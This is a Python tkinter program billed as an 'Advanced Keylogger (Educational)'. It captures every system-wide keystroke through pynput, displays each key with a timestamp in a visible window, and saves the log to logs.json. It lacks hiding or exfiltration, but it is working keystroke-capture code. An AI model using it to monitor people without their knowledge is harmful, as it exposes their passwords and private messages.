import tkinter as tk
from pynput import keyboard
import json
from datetime import datetime

log_data = []
listener = None

# -----------------------
# Key Capture Function
# -----------------------
def on_press(key):
    try:
        k = key.char
    except:
        k = str(key).replace("Key.", "")  # cleaner names

    timestamp = datetime.now().strftime("%H:%M:%S")

    entry = {
        "key": k,
        "time": timestamp
    }

    log_data.append(entry)

    # Show in GUI (clean format)
    text_area.insert(tk.END, f"{timestamp}  →  {k}\n")
    text_area.see(tk.END)

    # Save to JSON
    with open("logs.json", "w") as f:
        json.dump(log_data, f, indent=4)


# -----------------------
# Control Functions
# -----------------------
def start_keylogger():
    global listener
    if listener:
        return  # prevent multiple listeners
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    status_label.config(text="Status: Running", fg="green")


def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        listener = None
        status_label.config(text="Status: Stopped", fg="red")


def clear_logs():
    text_area.delete(1.0, tk.END)
    log_data.clear()
    with open("logs.json", "w") as f:
        json.dump([], f)

    # Re-add heading after clearing
    add_heading()


def add_heading():
    text_area.insert(tk.END, "Time       →  Key Pressed\n")
    text_area.insert(tk.END, "-----------------------------\n")


# -----------------------
# GUI DESIGN (DARK THEME)
# -----------------------
root = tk.Tk()
root.title("💜 Advanced Keylogger (Educational)")
root.geometry("520x520")
root.configure(bg="#121212")

title = tk.Label(root, text="KEYLOGGER", font=("Arial", 16, "bold"),
                 bg="#121212", fg="#bb86fc")
title.pack(pady=10)

# Buttons
btn_frame = tk.Frame(root, bg="#121212")
btn_frame.pack(pady=10)

tk.Button(btn_frame, text="Start", command=start_keylogger,
          bg="#03dac6").grid(row=0, column=0, padx=5)

tk.Button(btn_frame, text="Stop", command=stop_keylogger,
          bg="#cf6679").grid(row=0, column=1, padx=5)

tk.Button(btn_frame, text="Clear Logs", command=clear_logs,
          bg="#bb86fc").grid(row=0, column=2, padx=5)

# Status
status_label = tk.Label(root, text="Status: Idle",
                        bg="#121212", fg="white")
status_label.pack()

# Text Area + Scrollbar
frame = tk.Frame(root)
frame.pack(fill="both", expand=True, padx=10, pady=10)

text_area = tk.Text(frame, bg="black", fg="#00ffcc")
text_area.pack(side="left", fill="both", expand=True)

scroll = tk.Scrollbar(frame, command=text_area.yview)
scroll.pack(side="right", fill="y")

text_area.config(yscrollcommand=scroll.set)

# Add heading initially
add_heading()

root.mainloop()
